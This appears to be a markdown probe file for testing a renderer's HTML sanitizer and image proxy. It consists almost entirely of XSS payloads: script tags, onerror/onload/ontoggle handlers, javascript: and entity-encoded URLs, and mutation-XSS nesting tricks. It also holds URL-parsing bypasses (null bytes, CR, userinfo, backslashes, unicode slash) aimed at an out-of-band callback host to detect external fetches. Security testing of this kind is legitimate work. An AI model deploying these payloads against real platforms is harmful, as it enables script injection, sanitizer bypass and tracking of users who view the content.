# markdown render probes

## p01_script

<script>window.__p01=1</script>

## p02_img_onerror

<img src=x onerror="window.__p02=1">

## p03_svg_onload

<svg onload="window.__p03=1"></svg>

## p04_iframe_js

<iframe src="javascript:window.__p04=1"></iframe>

## p05_a_js

<a href="javascript:window.__p05=1">p05</a>

## p06_ext_img

<img src="https://probe-oob.ninja.ovh/p06.png">

## p07_style_url

<style>body{background:url(https://probe-oob.ninja.ovh/p07.png)}</style>

## p08_object

<object data="https://probe-oob.ninja.ovh/p08.swf"></object>

## p09_embed

<embed src="https://probe-oob.ninja.ovh/p09.swf">

## p10_form

<form action="https://probe-oob.ninja.ovh/p10"><input name=x></form>

## p11_details

<details open ontoggle="window.__p11=1">x</details>

## p12_a_js_entity

<a href="java&#115;cript:window.__p12=1">p12</a>

## p13_math_style

<math><mtext><style><img src=x onerror="window.__p13=1"></style></mtext></math>

## p14_noscript

<noscript><p title="</noscript><img src=x onerror=window.__p14=1>">

## p15_template

<template><img src=x onerror="window.__p15=1"></template>

## p16_svg_foreign

<svg><foreignObject><iframe src="javascript:window.__p16=1"></iframe></foreignObject></svg>

## p17_link_css

<link rel=stylesheet href="https://probe-oob.ninja.ovh/p17.css">

## p18_meta_refresh

<meta http-equiv="refresh" content="0;url=https://probe-oob.ninja.ovh/p18">

## p19_base

<base href="https://probe-oob.ninja.ovh/">

## p20_srcset

<img srcset="https://probe-oob.ninja.ovh/p20.png 1x" src="https://probe-oob.ninja.ovh/p20b.png">

## p21_picture

<picture><source srcset="https://probe-oob.ninja.ovh/p21.png"><img src="https://probe-oob.ninja.ovh/p21b.png"></picture>

## p22_video_poster

<video poster="https://probe-oob.ninja.ovh/p22.png"><source src="https://probe-oob.ninja.ovh/p22.mp4"></video>

## p23_bgsound

<audio src="https://probe-oob.ninja.ovh/p23.mp3" controls></audio>

## p24_input_img

<input type=image src="https://probe-oob.ninja.ovh/p24.png">

## p25_table_bg

<table background="https://probe-oob.ninja.ovh/p25.png"><tr><td>x</td></tr></table>

# camo probes

## m01_plain

![m01](https://probe-oob.ninja.ovh/m01.png)

## m02_space

![m02](https://probe-oob.ninja.ovh/m02.png )

## m03_at

![m03](https://evil@probe-oob.ninja.ovh/m03.png)

## m04_backslash

![m04](https:\\probe-oob.ninja.ovh\m04.png)

## m05_nullish

![m05](https://probe-oob.ninja.ovh%00/m05.png)

## m06_cr

![m06](https://probe-oob.ninja.ovh%0d/m06.png)

## m07_doubleslash

![m07](//probe-oob.ninja.ovh/m07.png)

## m08_upper

![m08](HTTPS://probe-oob.ninja.ovh/m08.png)

## m09_port

![m09](https://probe-oob.ninja.ovh:443/m09.png)

## m10_userinfo

![m10](https://probe-oob.ninja.ovh:@probe-oob.ninja.ovh/m10.png)

## m11_tab

![m11](https://probe-oob.ninja.ovh	/m11.png)

## m12_unicode

![m12](https://probe-oob.ninja.ovh⁄m12.png)

## m13_html_img

<img src="https://probe-oob.ninja.ovh/m13.png">

## m14_ref

![m14][r14]

[r14]: https://probe-oob.ninja.ovh/m14.png

## m15_data

![m15](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)
